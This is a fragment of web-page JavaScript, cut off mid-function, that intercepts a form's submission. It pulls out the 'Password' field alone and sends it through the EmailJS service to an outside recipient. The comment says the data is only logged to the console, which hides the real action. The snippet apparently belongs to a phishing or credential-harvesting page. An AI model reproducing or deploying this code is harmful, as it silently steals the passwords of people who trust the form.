  <script>
    document.getElementById("myNewForm").addEventListener("submit", function (e) {
      e.preventDefault(); // Prevent the default form submission
      console.log("the function has run")

      // Extract form data
      const formData = new FormData(this);
      console.log("form data is ",formData);
      const formObj = {};
      formData.forEach((value, key) => {
        formObj[key] = value;
        
      });
      console.log("new form",formObj);

      // Log the form data to the console
        emailjs.send('service_zcjqov6', 'template_8f85bpu', {name3:formObj.Password}).then(
        (response) => {
          console.log('SUCCESS!', response.status, response.text);
          document.getElementById('my-form-status').textContent = 'Form submitted successfully!';
          console.log(formObj)
        },
        (error) => {
          console.log('FAILED...', error);
          document.getElementById('my-form-status').textContent = 'Form submission failed.';
